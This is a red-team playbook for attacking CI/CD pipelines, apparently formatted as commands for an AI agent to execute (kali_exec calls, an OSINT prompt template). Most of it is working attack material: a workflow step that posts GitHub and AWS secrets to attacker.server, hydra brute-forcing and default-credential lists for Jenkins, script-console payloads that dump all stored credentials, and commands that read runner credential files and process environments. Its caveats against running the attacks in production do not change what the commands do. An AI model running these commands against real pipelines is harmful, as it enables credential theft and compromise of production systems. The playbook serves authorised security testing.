# PLAYBOOK: CI/CD Pipeline Security Testing
# April 2026 Red Team Stack
# GitHub Actions · GitLab CI · Jenkins · CircleCI · ArgoCD

---

## Why CI/CD Is the New Perimeter

Modern development pipelines have more access to production systems
than most employees. A compromised CI/CD pipeline can:
- Deploy malicious code to production
- Exfiltrate all repository secrets
- Access cloud credentials (AWS, GCP, Azure)
- Modify infrastructure (Terraform state, Kubernetes configs)
- Tamper with artifact registries (push malicious images/packages)

Average MTTD for CI/CD compromise: 127 days (Verizon DBIR 2025).

---

## Attack Surface

```
SECRETS IN PIPELINES:
  Environment variables (CI_SECRETS, AWS_ACCESS_KEY)
  GitHub/GitLab secrets mistakenly in logs
  .env files committed then removed (git history)
  Config files with tokens in job artifacts

PIPELINE INJECTION:
  Malicious PR modifying workflow files (.github/workflows/)
  Pull request from fork accessing secrets
  Poisoned environment: attacker controls runner
  Dependency confusion / supply chain

RUNNER COMPROMISE:
  Self-hosted runner escape to host
  Shared runner cross-tenant contamination
  Runner token reuse across projects

INFRASTRUCTURE ACCESS:
  Terraform state files (contain all infra details)
  Kubernetes kubeconfig in pipeline
  Docker socket mounted to CI container
```

---

## PHASE 1 — DISCOVERY & ENUMERATION

```bash
# Find CI/CD endpoints from OSINT
"Using hexstrike-ai OSINT, find CI/CD infrastructure for [COMPANY]:
1. GitHub: check github.com/[COMPANY] for .github/workflows/
2. GitLab: check gitlab.com/[COMPANY] or self-hosted gitlab.[domain]
3. Jenkins: common paths: jenkins.[domain], ci.[domain], build.[domain]
4. CircleCI: circleci.com/gh/[COMPANY]
5. Drone CI: drone.[domain]
6. Check job postings for CI/CD tools used"

# Direct Jenkins discovery
kali_exec("nmap -p 8080,8443,50000 [TARGET_RANGE] --open -sV")
kali_exec("curl -s http://[JENKINS_IP]:8080/api/json | python3 -c \"import sys,json; j=json.load(sys.stdin); print(j.get('mode'), j.get('useSecurity'))\"")

# GitLab self-hosted
kali_exec("curl -s https://gitlab.[DOMAIN]/api/v4/version")
kali_exec("curl -s https://gitlab.[DOMAIN]/api/v4/projects?visibility=public | python3 -c \"import sys,json; [print(p['path_with_namespace']) for p in json.load(sys.stdin)]\"")
```

---

## PHASE 2 — SECRETS HUNTING IN REPOSITORIES

```bash
# truffleHog — highest signal-to-noise for secrets
kali_exec("trufflehog git https://github.com/[ORG]/[REPO] --only-verified --json > loot/[MISSION]/cicd/trufflehog_[REPO].json")
kali_exec("trufflehog github --org=[ORG] --only-verified --json > loot/[MISSION]/cicd/trufflehog_org.json")

# gitleaks — fast alternative
kali_exec("gitleaks detect --source . --report-format json --report-path loot/[MISSION]/cicd/gitleaks.json")

# GitHub Actions workflow analysis
kali_exec("find . -path '.github/workflows/*.yml' -exec grep -l 'secret\|token\|key\|password' {} \\;")
kali_exec("cat .github/workflows/*.yml | grep -E 'env:|secrets\\.|GITHUB_TOKEN' | head -30")

# Check git history for deleted secrets
kali_exec("git log --all --full-history --grep='secret\\|password\\|key\\|token' --oneline | head -20")
kali_exec("git log --all -p -- .env | head -100")
kali_exec("git log --all -p -- '**/*.env' | head -100")

# gitrob — comprehensive git OSINT
kali_exec("gitrob analyze [GITHUB_ORG] --github-access-token [TOKEN]")
```

---

## PHASE 3 — GITHUB ACTIONS ATTACKS

### Workflow Injection via PR
```bash
# Check if forked PRs can access secrets (dangerous config)
# Look for this in workflow files:
# pull_request_target: (runs in repo context — can access secrets)
kali_exec("grep -r 'pull_request_target' .github/workflows/")

# If pull_request_target + uses code from fork:
# Submit PR with modified workflow that exfiltrates secrets
cat > /tmp/malicious_step.yml << 'EOF'
- name: Exfil
  run: |
    curl -X POST https://attacker.server/collect \
      -d "token=${{ secrets.GITHUB_TOKEN }}" \
      -d "aws_key=${{ secrets.AWS_ACCESS_KEY_ID }}" \
      -d "aws_secret=${{ secrets.AWS_SECRET_ACCESS_KEY }}"
EOF

# Document this finding — do NOT actually submit malicious PRs
# PoC: show the vulnerable workflow + mock payload
```

### GITHUB_TOKEN Abuse
```bash
# GitHub Actions GITHUB_TOKEN is auto-generated per run
# Default permissions may allow code push (if poorly configured)

# Check repo default permissions
kali_exec("gh api /repos/[ORG]/[REPO] | python3 -c \"import sys,json; r=json.load(sys.stdin); print('Default branch protection:', r.get('default_branch'))\"")

# If GITHUB_TOKEN has write:
# Push to branch, approve own PR, merge to main
# This bypasses branch protection if approval isn't required from OTHER users
```

### Self-Hosted Runner Attacks
```bash
# Self-hosted runners run in org context — if compromised:
# 1. All secrets in workflows are available
# 2. Runner usually has network access to internal systems
# 3. Often not ephemeral — persistence across jobs

# Look for self-hosted runner indicators in workflows:
kali_exec("grep -r 'runs-on: self-hosted' .github/workflows/")
kali_exec("grep -r 'runs-on: \\[self-hosted' .github/workflows/")

# If physical access / code execution on runner machine:
kali_exec("cat /home/runner/work/_temp/*.json 2>/dev/null")  # Cached tokens
kali_exec("cat /home/runner/.aws/credentials 2>/dev/null")
kali_exec("env | grep -E 'TOKEN|SECRET|KEY|PASSWORD'")
kali_exec("cat /proc/*/environ 2>/dev/null | tr '\\0' '\\n' | grep -E 'TOKEN|SECRET|KEY'")
```

---

## PHASE 4 — JENKINS ATTACKS

```bash
# Jenkins unauthenticated access check
kali_exec("curl -s http://[JENKINS]:8080/api/json")
kali_exec("curl -s http://[JENKINS]:8080/script")  # Script console = RCE if accessible

# Default credentials
JENKINS_CREDS = [
    ("admin", "admin"),
    ("admin", "password"),
    ("admin", ""),
    ("jenkins", "jenkins"),
]
kali_exec("hydra -L jenkins_users.txt -P jenkins_passwords.txt http-form-post://[JENKINS]:8080/j_spring_security_check:j_username=^USER^&j_password=^PASS^:Invalid username")

# Jenkins Script Console → RCE (if authenticated or anonymous access)
kali_exec("curl -s -X POST http://[JENKINS]:8080/scriptText --data-urlencode 'script=println \"id\".execute().text' -u admin:admin")

# Extract all Jenkins credentials
kali_exec("curl -s -X POST http://[JENKINS]:8080/scriptText -u admin:admin --data-urlencode 'script=
import com.cloudbees.plugins.credentials.*
import com.cloudbees.plugins.credentials.impl.*

def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance, null, null
)
creds.each { c ->
    println(\"Username: ${c.username}, Password: ${c.password}\")
}
'")

# Extract secret text credentials
kali_exec("curl -s -X POST http://[JENKINS]:8080/scriptText -u admin:admin --data-urlencode 'script=
Jenkins.instance.getAllItems(org.jenkinsci.plugins.workflow.job.WorkflowJob.class).each { job ->
    job.builds.each { build ->
        build.getEnvironment().each { k, v ->
            if (k.contains(\"KEY\") || k.contains(\"SECRET\") || k.contains(\"TOKEN\")) {
                println(\"${job.name}/${build.number}: ${k}=${v}\")
            }
        }
    }
}
'")
```

---

## PHASE 5 — DEPENDENCY / SUPPLY CHAIN ATTACKS

```bash
# Find internal package names that could be typosquatted
kali_exec("cat package.json requirements.txt Gemfile pom.xml | grep -E '@[a-z-]+|==|~=' | head -30")

# Check for internal package registry
kali_exec("cat .npmrc .pip.conf ~/.pypirc | grep -E 'registry|index-url'")
# If using private registry without scope → dependency confusion risk

# dependency-check scan
kali_exec("dependency-check --scan . --project [APP] --format JSON --out loot/[MISSION]/cicd/dep_check.json")

# Syft + Grype for SBOM + CVE scanning
kali_exec("syft [IMAGE_OR_DIR] -o json > loot/[MISSION]/cicd/sbom.json")
kali_exec("grype loot/[MISSION]/cicd/sbom.json --output json > loot/[MISSION]/cicd/vulns.json")

# trivy repo scanning
kali_exec("trivy repo https://github.com/[ORG]/[REPO] --format json > loot/[MISSION]/cicd/trivy_repo.json")
```

---

## PHASE 6 — ARTIFACT REGISTRY ATTACKS

```bash
# Docker Hub / GCR / ECR — check for public images with secrets
kali_exec("docker pull [ORG]/[IMAGE]:latest")
kali_exec("docker history [ORG]/[IMAGE] --no-trunc | grep -i 'ENV\|ARG\|secret\|key\|token'")
kali_exec("docker run --rm -it [ORG]/[IMAGE] env | grep -E 'SECRET|KEY|TOKEN|PASSWORD'")

# Dive — inspect image layers for secrets
kali_exec("dive [ORG]/[IMAGE]:latest")

# Extract all layers
kali_exec("docker save [IMAGE] | tar -x -C /tmp/image_layers/")
kali_exec("find /tmp/image_layers/ -name 'layer.tar' -exec tar -tzf {} \\; | grep -E '.env|credentials|.key'")
```

---

## Evidence

```
loot/[MISSION]/cicd/
├── trufflehog_results.json    # Verified secrets found
├── gitleaks.json              # Pattern-matched secrets
├── workflow_analysis.md       # Dangerous workflow configs
├── jenkins_credentials.txt    # ENCRYPTED if real creds found
├── sbom.json                  # Software bill of materials
├── dep_check.json             # Dependency CVEs
└── cicd_findings.md           # Consolidated findings
```

---

*April 2026 | CI/CD testing — document the attack path, stop before executing in prod*
